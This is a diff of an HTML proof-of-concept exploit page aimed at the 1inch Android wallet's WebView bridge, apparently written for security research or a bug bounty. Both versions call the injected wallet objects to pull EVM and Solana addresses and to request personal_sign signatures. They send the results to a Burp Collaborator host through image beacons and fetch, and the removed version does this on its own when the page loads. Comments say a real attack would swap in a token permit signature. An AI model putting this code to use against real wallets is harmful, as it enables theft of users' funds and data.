@@ -1,158 +1,315 @@
-<!doctype html>
+<!DOCTYPE html>
 <html>
-<head><meta charset="utf-8"><title>1inch WebView Bridge PoC</title></head>
-<body style="font-family:-apple-system,sans-serif;padding:16px">
-<h3>1inch Android — action_deeplink → w3browser PoC</h3>
-<pre id="log">waiting for bridge...</pre>
-<button id="signBtn" disabled>personal_sign (permit-style)</button>
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>1inch Wallet Bridge Test</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            margin: 20px;
+            background: #f0f0f0;
+        }
+        .container {
+            max-width: 600px;
+            margin: 0 auto;
+            background: white;
+            padding: 20px;
+            border-radius: 8px;
+        }
+        .status {
+            padding: 10px;
+            margin: 10px 0;
+            border-radius: 4px;
+        }
+        .success { background: #d4edda; border: 1px solid #c3e6cb; }
+        .info { background: #d1ecf1; border: 1px solid #bee5eb; }
+        .warning { background: #fff3cd; border: 1px solid #ffeaa7; }
+        button {
+            background: #007bff;
+            color: white;
+            border: none;
+            padding: 10px 20px;
+            border-radius: 4px;
+            cursor: pointer;
+            margin: 5px;
+        }
+        button:hover { background: #0056b3; }
+        .log {
+            background: #f8f9fa;
+            border: 1px solid #e9ecef;
+            padding: 10px;
+            margin: 10px 0;
+            border-radius: 4px;
+            white-space: pre-wrap;
+            font-family: monospace;
+            max-height: 300px;
+            overflow-y: auto;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>🔓 1inch Wallet Bridge PoC</h1>
 
-<script>
-// ====== CONFIG ======
-// Замени на свой Burp Collaborator хост
-var COLLAB = "https://bo3ocvi12picqdadm4fxriio7fd61xpm.oastify.com";
-// ====================
+        <div id="bridgeStatus" class="status warning">
+            Checking wallet bridge availability...
+        </div>
 
-var logEl = document.getElementById('log');
-function log(){
-  var s = Array.prototype.slice.call(arguments).map(function(x){
-    try { return typeof x==='string'? x : JSON.stringify(x); } catch(e){ return String(x); }
-  }).join(' ');
-  logEl.textContent += "\n" + s;
-  console.log(s);
-}
+        <div id="walletInfo"></div>
 
-function exfil(tag, data){
-  try {
-    var payload = {
-      tag: tag,
-      ua: navigator.userAgent,
-      href: location.href,
-      data: data,
-      t: Date.now()
-    };
-    // 1) image beacon — работает даже если fetch заблокирован CSP
-    var img = new Image();
-    img.src = COLLAB + "/" + encodeURIComponent(tag) +
-              "?d=" + encodeURIComponent(JSON.stringify(payload));
-    // 2) fetch — на случай если есть
-    if (window.fetch) {
-      fetch(COLLAB + "/f/" + tag, {
-        method: "POST",
-        mode: "no-cors",
-        body: JSON.stringify(payload)
-      }).catch(function(){});
-    }
-  } catch(e) { log("exfil err", e.message); }
-}
+        <div>
+            <button onclick="getWalletAddress()">Get Wallet Address</button>
+            <button onclick="testPersonalSign()">Test Personal Sign</button>
+            <button onclick="testSolanaWallet()">Test Solana Wallet</button>
+            <button onclick="sendToCollaborator()">Send Data to Collaborator</button>
+        </div>
 
-// Прилетевший адрес от нативного кода:
-//   window.OneInchIOSWallet.accountChanged('0x...')
-//   window.OneInchSolanaWallet.accountChanged('...')
-function hookWalletObject(name){
-  var tries = 0;
-  var iv = setInterval(function(){
-    tries++;
-    var w = window[name];
-    if (w && typeof w.accountChanged === 'function' && !w.__hooked){
-      var orig = w.accountChanged.bind(w);
-      w.accountChanged = function(addr){
-        log(name + ".accountChanged:", addr);
-        exfil(name + "_account", { address: addr });
-        try { return orig(addr); } catch(e){}
-      };
-      w.__hooked = true;
-      log("hooked " + name);
-    }
-    if (tries > 200) clearInterval(iv);
-  }, 50);
-}
-hookWalletObject('OneInchIOSWallet');
-hookWalletObject('OneInchSolanaWallet');
+        <div>
+            <label>Collaborator URL:</label>
+            <input type="text" id="collaboratorUrl" value="https://m7uzv61cl01n9oto5fy8at1zqqwhk98y.oastify.com style="width: 100%; margin: 5px 0;">
+        </div>
 
-// Прямой вызов request() — возвращает accounts
-function probeEvm(){
-  var W = window.OneInchIOSWallet;
-  if (!W || typeof W.request !== 'function') {
-    log("OneInchIOSWallet.request not available yet");
-    return;
-  }
-  try {
-    var p = W.request({ method: "eth_accounts", params: [] });
-    if (p && p.then) {
-      p.then(function(r){
-        log("eth_accounts:", r);
-        exfil("eth_accounts", r);
-      }).catch(function(e){ log("eth_accounts err", e && e.message); });
-    } else {
-      log("eth_accounts sync:", p);
-      exfil("eth_accounts_sync", p);
-    }
-  } catch(e) { log("probeEvm err", e.message); }
+        <div class="log" id="logOutput"></div>
+    </div>
 
-  try {
-    var p2 = W.request({ method: "eth_chainId", params: [] });
-    if (p2 && p2.then) p2.then(function(r){
-      log("chainId:", r); exfil("chainId", r);
-    });
-  } catch(e){}
-}
+    <script>
+        let walletData = {
+            evmAddress: null,
+            solanaAddress: null,
+            bridgeAvailable: false,
+            timestamp: new Date().toISOString()
+        };
 
-function probeSol(){
-  var S = window.OneInchSolanaWallet;
-  if (!S || typeof S.request !== 'function') return;
-  try {
-    var p = S.request({ method: "connect", params: [] });
-    if (p && p.then) p.then(function(r){
-      log("sol connect:", r); exfil("sol_connect", r);
-    });
-  } catch(e){ log("probeSol err", e.message); }
-}
+        function log(message) {
+            const logOutput = document.getElementById('logOutput');
+            const timestamp = new Date().toLocaleTimeString();
+            logOutput.textContent += `[${timestamp}] ${message}\n`;
+            logOutput.scrollTop = logOutput.scrollHeight;
+            console.log(message);
+        }
 
-// Прямое сырое сообщение в мост — подстраховка на случай,
-// если обёртка OneInchIOSWallet инициализируется поздно.
-function rawBridge(){
-  try {
-    if (window.jsBridge && typeof jsBridge.postEvmMessage === 'function') {
-      var id = Math.floor(Math.random()*1e9);
-      jsBridge.postEvmMessage(JSON.stringify({
-        id: id, jsonrpc: "2.0",
-        method: "eth_accounts", params: []
-      }));
-      log("raw postEvmMessage sent id=" + id);
-    } else {
-      log("jsBridge not exposed on window");
-    }
-  } catch(e){ log("rawBridge err", e.message); }
-}
+        function updateStatus(message, type = 'info') {
+            const status = document.getElementById('bridgeStatus');
+            status.textContent = message;
+            status.className = `status ${type}`;
+        }
 
-// Демонстрация impact: personal_sign — в реальной атаке сюда ставится
-// EIP-2612 permit / Permit2 / Seaport-order. Для PoC — безобидная строка.
-document.getElementById('signBtn').onclick = function(){
-  var W = window.OneInchIOSWallet;
-  if (!W) return log("no wallet");
-  W.request({ method: "eth_accounts", params: [] }).then(function(accs){
-    var addr = (accs && accs[0]) || "0x0";
-    var msg = "0x" + Array.from("PoC: proving signature capture — "+Date.now())
-                .map(function(c){return c.charCodeAt(0).toString(16).padStart(2,'0');}).join('');
-    return W.request({ method: "personal_sign", params: [msg, addr] });
-  }).then(function(sig){
-    log("signature:", sig);
-    exfil("personal_sign", { signature: sig });
-  }).catch(function(e){ log("sign err", e && e.message); });
-};
+        function checkWalletBridge() {
+            log('Checking for 1inch wallet bridge...');
 
-// Автостарт
-setTimeout(function(){
-  exfil("loaded", { bridges: {
-    evm: !!window.OneInchIOSWallet,
-    sol: !!window.OneInchSolanaWallet,
-    raw: !!(window.jsBridge && window.jsBridge.postEvmMessage)
-  }});
-  probeEvm();
-  probeSol();
-  rawBridge();
-  document.getElementById('signBtn').disabled = false;
-}, 500);
-</script>
+            // Check for injected wallet objects
+            if (window.OneInchIOSWallet) {
+                log('✅ OneInchIOSWallet bridge found!');
+                walletData.bridgeAvailable = true;
+                updateStatus('1inch Wallet Bridge Available!', 'success');
+
+                // Try to get wallet address automatically
+                setTimeout(getWalletAddress, 500);
+            } else {
+                log('❌ OneInchIOSWallet not found');
+                updateStatus('Wallet bridge not detected', 'warning');
+            }
+
+            if (window.OneInchSolanaWallet) {
+                log('✅ OneInchSolanaWallet bridge found!');
+            }
+
+            if (window.jsBridge) {
+                log('✅ jsBridge interface found!');
+            }
+
+            // Log all available window properties that might be wallet-related
+            const walletProps = Object.keys(window).filter(key =>
+                key.toLowerCase().includes('wallet') ||
+                key.toLowerCase().includes('oneinch') ||
+                key.toLowerCase().includes('bridge')
+            );
+            log(`Available wallet properties: ${walletProps.join(', ')}`);
+        }
+
+        function getWalletAddress() {
+            log('Attempting to get wallet address...');
+
+            try {
+                if (window.OneInchIOSWallet) {
+                    // Try to request account info
+                    window.OneInchIOSWallet.request({
+                        method: 'eth_accounts',
+                        params: []
+                    }).then(accounts => {
+                        if (accounts && accounts.length > 0) {
+                            walletData.evmAddress = accounts[0];
+                            log(`✅ EVM Address obtained: ${accounts[0]}`);
+                            updateWalletInfo();
+                        }
+                    }).catch(err => {
+                        log(`❌ Error getting accounts: ${err.message}`);
+                    });
+
+                    // Also try eth_requestAccounts
+                    window.OneInchIOSWallet.request({
+                        method: 'eth_requestAccounts',
+                        params: []
+                    }).then(accounts => {
+                        if (accounts && accounts.length > 0) {
+                            walletData.evmAddress = accounts[0];
+                            log(`✅ EVM Address via requestAccounts: ${accounts[0]}`);
+                            updateWalletInfo();
+                        }
+                    }).catch(err => {
+                        log(`Request accounts error: ${err.message}`);
+                    });
+                } else {
+                    log('❌ OneInchIOSWallet not available');
+                }
+
+                // Try Solana wallet
+                if (window.OneInchSolanaWallet) {
+                    window.OneInchSolanaWallet.connect().then(account => {
+                        if (account && account.publicKey) {
+                            walletData.solanaAddress = account.publicKey.toString();
+                            log(`✅ Solana Address: ${walletData.solanaAddress}`);
+                            updateWalletInfo();
+                        }
+                    }).catch(err => {
+                        log(`Solana connection error: ${err.message}`);
+                    });
+                }
+            } catch (error) {
+                log(`❌ Error in getWalletAddress: ${error.message}`);
+            }
+        }
+
+        function testPersonalSign() {
+            log('Testing personal_sign...');
+
+            if (!window.OneInchIOSWallet) {
+                log('❌ OneInchIOSWallet not available');
+                return;
+            }
+
+            if (!walletData.evmAddress) {
+                log('⚠️ No EVM address available, getting address first...');
+                getWalletAddress();
+                setTimeout(testPersonalSign, 2000);
+                return;
+            }
+
+            const message = "PoC: Testing 1inch wallet bridge access";
+            const msgHex = '0x' + Buffer.from(message, 'utf8').toString('hex');
+
+            window.OneInchIOSWallet.request({
+                method: 'personal_sign',
+                params: [msgHex, walletData.evmAddress]
+            }).then(signature => {
+                log(`✅ Personal sign successful: ${signature}`);
+                walletData.testSignature = signature;
+            }).catch(error => {
+                log(`❌ Personal sign error: ${error.message}`);
+            });
+        }
+
+        function testSolanaWallet() {
+            log('Testing Solana wallet...');
+
+            if (!window.OneInchSolanaWallet) {
+                log('❌ OneInchSolanaWallet not available');
+                return;
+            }
+
+            window.OneInchSolanaWallet.connect().then(account => {
+                log(`✅ Solana wallet connected: ${account.publicKey.toString()}`);
+                walletData.solanaAddress = account.publicKey.toString();
+                updateWalletInfo();
+            }).catch(error => {
+                log(`❌ Solana wallet error: ${error.message}`);
+            });
+        }
+
+        function sendToCollaborator() {
+            const collaboratorUrl = document.getElementById('collaboratorUrl').value;
+
+            if (!collaboratorUrl || !collaboratorUrl.startsWith('http')) {
+                log('❌ Please enter a valid collaborator URL');
+                return;
+            }
+
+            log('Sending data to collaborator...');
+
+            const payload = {
+                ...walletData,
+                userAgent: navigator.userAgent,
+                url: window.location.href,
+                referrer: document.referrer,
+                timestamp: new Date().toISOString(),
+                availableObjects: Object.keys(window).filter(key =>
+                    key.toLowerCase().includes('wallet') ||
+                    key.toLowerCase().includes('oneinch') ||
+                    key.toLowerCase().includes('bridge')
+                )
+            };
+
+            // Send via fetch
+            fetch(collaboratorUrl, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify(payload)
+            }).then(response => {
+                log(`✅ Data sent to collaborator (status: ${response.status})`);
+            }).catch(error => {
+                log(`❌ Collaborator send error: ${error.message}`);
+            });
+
+            // Also try via image request for DNS exfiltration
+            const encodedData = btoa(JSON.stringify(payload)).slice(0, 50);
+            const img = new Image();
+            img.src = `${collaboratorUrl}/${encodedData}.png`;
+            img.onload = () => log('✅ Image request sent');
+            img.onerror = () => log('❌ Image request failed');
+        }
+
+        function updateWalletInfo() {
+            const walletInfo = document.getElementById('walletInfo');
+            let html = '<div class="status info"><h3>Wallet Information</h3>';
+
+            if (walletData.evmAddress) {
+                html += `<p><strong>EVM Address:</strong> ${walletData.evmAddress}</p>`;
+            }
+
+            if (walletData.solanaAddress) {
+                html += `<p><strong>Solana Address:</strong> ${walletData.solanaAddress}</p>`;
+            }
+
+            html += '</div>';
+            walletInfo.innerHTML = html;
+        }
+
+        // Auto-start when page loads
+        window.addEventListener('load', () => {
+            log('🚀 1inch Wallet Bridge PoC started');
+            log(`User Agent: ${navigator.userAgent}`);
+            log(`Page URL: ${window.location.href}`);
+
+            checkWalletBridge();
+        });
+
+        // Listen for wallet events
+        if (window.OneInchIOSWallet) {
+            window.OneInchIOSWallet.on?.('accountsChanged', (accounts) => {
+                log(`🔄 Accounts changed: ${accounts.join(', ')}`);
+                if (accounts.length > 0) {
+                    walletData.evmAddress = accounts[0];
+                    updateWalletInfo();
+                }
+            });
+
+            window.OneInchIOSWallet.on?.('chainChanged', (chainId) => {
+                log(`🔄 Chain changed: ${chainId}`);
+            });
+        }
+    </script>
 </body>
 </html>
